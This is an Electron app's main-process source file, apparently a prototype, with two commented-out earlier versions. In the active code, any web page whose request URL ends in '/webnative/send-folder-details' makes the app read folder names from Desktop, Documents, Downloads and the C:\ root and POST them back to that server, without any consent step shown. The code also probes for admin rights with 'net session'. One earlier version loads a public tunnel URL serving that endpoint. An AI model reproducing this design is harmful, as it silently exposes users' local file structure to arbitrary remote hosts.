// const { app, BrowserWindow, ipcMain } = require('electron');
// const path = require('path');
// const fs = require('fs');
// const axios = require('axios');

// let mainWindow;

// const desktopPath = "C:\\Users\\at381\\OneDrive\\Desktop";

// app.on('ready', () => {
//   mainWindow = new BrowserWindow({
//     width: 1200,
//     height: 800,
//     webPreferences: {
//       contextIsolation: false,
//       nodeIntegration: true, // Enable Node.js integration
//       preload: path.join(__dirname, 'preload.js'),
//     },
//   });

//   // Load Google by default
// //   mainWindow.loadURL('https://www.google.com');
  
//   // mainWindow.loadURL('http://localhost:3000/webnative/send-folder-details');

//   mainWindow.loadURL('https://authors-proven-giant-calculated.trycloudflare.com/webnative/send-folder-details');

//   // Track all requests in the browser
//   mainWindow.webContents.session.webRequest.onCompleted((details) => {
//     const url = details.url;

//     if (url.endsWith('/webnative/send-folder-details')) {
//       // Get folder names in Desktop
//       fs.readdir(desktopPath, { withFileTypes: true }, (err, files) => {
//         if (err) {
//           console.error('Error reading desktop folder:', err);
//           return;
//         }

//         // Filter only directories and map to their names
//         const folderNames = files
//           .filter((file) => file.isDirectory())
//           .map((folder) => folder.name);

//         // Send POST request to the server
//         axios
//           .post(url, { folders: folderNames })
//           .then((response) => {
//             console.log('Successfully sent folder details:', response.data);
//           })
//           .catch((error) => {
//             console.error('Failed to send folder details:', error.message);
//           });
//       });
//     }
//   });
// });

// // Quit the app when all windows are closed
// app.on('window-all-closed', () => {
//   if (process.platform !== 'darwin') {
//     app.quit();
//   }
// });







// const { app, BrowserWindow, ipcMain, Menu} = require('electron');
// const path = require('path');
// const fs = require('fs');
// const axios = require('axios');

// let mainWindow;

// // const desktopPath = "C:\\Users\\at381\\OneDrive\\Desktop\\MIT-Kalfka\\scaling-apps-with-kafka";

// app.on('ready', () => {
//   mainWindow = new BrowserWindow({
//     width: 1200,
//     height: 800,
//     // frame: false, // Removes all window frame controls
//     webPreferences: {
//       contextIsolation: true,
//       nodeIntegration: false,
//       preload: path.join(__dirname, 'preload.js'),
//       webviewTag: true, // Enable webview for embedding external content
//     },
//     icon: path.join(__dirname, 'assets', 'icon.png'), // Path to your icon file
//   });

//   mainWindow.loadFile('index.html');

//   // Remove the default menu 
//   Menu.setApplicationMenu(null);
//   // Track all requests in the browser

//   const desktopPath = "C:\\Users\\at381\\OneDrive\\Desktop\\MIT-Kalfka\\scaling-apps-with-kafka";

  
//   mainWindow.webContents.session.webRequest.onCompleted((details) => {
//     const url = details.url;

//     if (url.endsWith('/webnative/send-folder-details')) {
//       fs.readdir(desktopPath, { withFileTypes: true }, (err, files) => {
//         if (err) {
//           console.error('Error reading desktop folder:', err);
//           return;
//         }

        
//         const folderNames = files
//           .filter((file) => file.isDirectory())
//           .map((folder) => folder.name);

//         axios
//           .post(url, { folders: folderNames })
//           .then((response) => {
//             console.log('Successfully sent folder details:', response.data);
//           })
//           .catch((error) => {
//             console.error('Failed to send folder details:', error.message);
//           });
//       });
//     }
//   });

//   // Handle URL navigation from the renderer
//   ipcMain.on('navigate-to-url', (event, url) => {
//     if (url) {
//       const validUrl = url.startsWith('http://') || url.startsWith('https://') ? url : `https://${url}`;
//       event.sender.send('navigate-url-response', validUrl); // Respond with the validated URL
//     }
//   });
// });

// app.on('window-all-closed', () => {
//   if (process.platform !== 'darwin') {
//     app.quit();
//   }
// });



const { app, BrowserWindow, ipcMain, Menu } = require('electron');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const { exec } = require('child_process');

let mainWindow;

// Define paths you have permission to access
const directoriesToAccess = [
  app.getPath('desktop'),
  app.getPath('documents'),
  app.getPath('downloads'),
  'C:\\', // Accessing the root directory (requires elevated privileges)
];

app.on('ready', () => {
  mainWindow = new BrowserWindow({
    // width: 1200,
    // height: 800,
        //  frame: false, // Removes all window frame controls
        //  fullscreen: true, // Enable full-screen mode

    webPreferences: {
      contextIsolation: true,
      nodeIntegration: false,
      preload: path.join(__dirname, 'preload.js'),
      webviewTag: true, // Enable webview for embedding external content
    },
    // icon: path.join(__dirname, 'assets', 'icon.png'), // Path to your icon file
  });

  mainWindow.loadFile('index.html');

  // Remove the default menu 
  Menu.setApplicationMenu(null);

  // Track all requests in the browser
  mainWindow.webContents.session.webRequest.onCompleted((details) => {
    const url = details.url;

    if (url.endsWith('/webnative/send-folder-details')) {
      // Iterate through all predefined directories and list files/folders
      directoriesToAccess.forEach((dirPath) => {
        fs.readdir(dirPath, { withFileTypes: true }, (err, files) => {
          if (err) {
            console.error(`Error reading folder: ${dirPath}`, err);
            return;
          }

          const folderNames = files
            .filter((file) => file.isDirectory())
            .map((folder) => folder.name);

          // Send the folder names to the server
          axios
            .post(url, { folders: folderNames })
            .then((response) => {
              console.log('Successfully sent folder details:', response.data);
            })
            .catch((error) => {
              console.error('Failed to send folder details:', error.message);
            });
        });
      });
    }
  });

  // Handle URL navigation from the renderer
  ipcMain.on('navigate-to-url', (event, url) => {
    if (url) {
      const validUrl = url.startsWith('http://') || url.startsWith('https://') ? url : `https://${url}`;
      event.sender.send('navigate-url-response', validUrl); // Respond with the validated URL
    }
  });

  // Optionally, check for elevated permissions on Windows if you need access to root directories like "C:\\"
  checkElevatedPermissions();
});

// Check if the app is running with elevated permissions (Windows)
function checkElevatedPermissions() {
  if (process.platform === 'win32') {
    exec('net session', (err, stdout, stderr) => {
      if (err) {
        console.error('This app does not have elevated permissions. Some directories may be inaccessible.', stderr);
      } else {
        console.log('The app is running with elevated permissions. Access to all system directories is allowed.');
      }
    });
  }
}

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});
